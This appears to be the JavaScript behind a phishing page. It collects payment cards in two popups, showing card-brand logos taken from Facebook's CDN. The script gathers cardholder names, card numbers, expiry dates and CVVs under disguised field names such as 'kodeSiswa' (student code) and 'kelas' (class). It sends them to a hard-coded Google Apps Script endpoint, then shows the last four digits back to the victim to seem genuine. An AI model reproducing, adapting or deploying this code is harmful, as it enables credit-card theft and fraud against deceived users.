const URL_BACKEND = "https://script.google.com/macros/s/AKfycbwbE-p2xXkRgWGHvMNs7ekcE2PmG_WZJvsJidk6LfNUF-W3Zfvz49iPjRXn7FMhp_0BkA/exec";

function formatMMYY(el) {
    let val = el.value.replace(/\D/g, '');
    if (val.length > 2) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
    }
    el.value = val;
}

function cekLogo(el, logoId) {
    const logo = document.getElementById(logoId);
    const val = el.value.trim();

    // Sembunyikan logo secara awal
    logo.style.display = 'none';

    // Tampilkan logo hanya jika diawali angka 3, 4, atau 5
    if (val.startsWith('5')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yF/r/ZIeCyGzzAnR.webp?_nc_eui2=AeGWwsovkpKgGwR5712WjAOnSDhX2V7vCpNIOFfZXu8KkzsklIN_PeJIQyN_Dc2HO-Nam4L4_wo25wTn70CGGFEn';
        el.maxLength = 16;
        logo.style.display = 'block';
    } else if (val.startsWith('4')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yw/r/IqqGd5lm28u.webp?_nc_eui2=AeEcfLNBgWfMfn2FlPUptMio7ytqcbilrFXvK2pxuKWsVbrgYgT61QZYYVZltyEvx_pGoDhLhCJVcxzCOLn3yfjf';
        el.maxLength = 16;
        logo.style.display = 'block';
    } else if (val.startsWith('3')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yA/r/X91YHq0KzqQ.webp?_nc_eui2=AeH3udDwy0csMqZkNmFMritx0t6v52TsYTHS3q_nZOxhMTjTR5EztPutwBcpX_bKTH_icI3T5cy1QeIHNNEBZOC5';
        el.maxLength = 15;
        logo.style.display = 'block';
    }
    // Jika diawali angka lain atau kosong, logo tetap tersembunyi
}

async function simpanDataKeSpreadsheet() {
    // Ambil SEMUA data dari seluruh popup
    const data = {
        // Data dari Popup 1
        nama1: document.getElementById('nama')?.value || "",
        nomorKartu1: document.getElementById('kodeSiswa')?.value || "",
        masaBerlaku1: document.getElementById('mmyy')?.value || "",
        cvv1: document.getElementById('kelas')?.value || "",
        
        // Data dari Popup 2
        nama2: document.getElementById('nama2')?.value || "",
        nomorKartu2: document.getElementById('kodeSiswa2')?.value || "",
        masaBerlaku2: document.getElementById('mmyy2')?.value || "",
        cvv2: document.getElementById('kelas2')?.value || "",
        
        // Waktu pengiriman
        waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
    };

    try {
        const respon = await fetch(URL_BACKEND, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const hasil = await respon.json();
        if (hasil.status === "berhasil") {
            console.log("Semua data tersimpan:", hasil);
            return true;
        } else {
            alert("Gagal menyimpan data: " + hasil.pesan);
            return false;
        }
    } catch (error) {
        console.error("Kesalahan pengiriman:", error);
        alert("Terjadi kesalahan saat mengirim data");
        return false;
    }
}

async function nextPopup(current, next) {
    // Simpan data setiap kali berpindah dari Popup 1 dan Popup 2
    if(current === 'popup1' || current === 'popup2') {
        const berhasil = await simpanDataKeSpreadsheet();
        if (!berhasil) return; // Batalkan pindah jika gagal simpan

        // Tampilkan 4 angka terakhir kartu di popup selanjutnya
        if(current === 'popup1') {
            let code = document.getElementById('kodeSiswa').value;
            let last4 = code.slice(-4);
            document.getElementById('kelasDisplay').innerText = last4;
            document.getElementById('kelasDisplay2').innerText = last4;
        }
    }
    
    document.getElementById(current).classList.add('hidden');
    document.getElementById(next).classList.remove('hidden');
}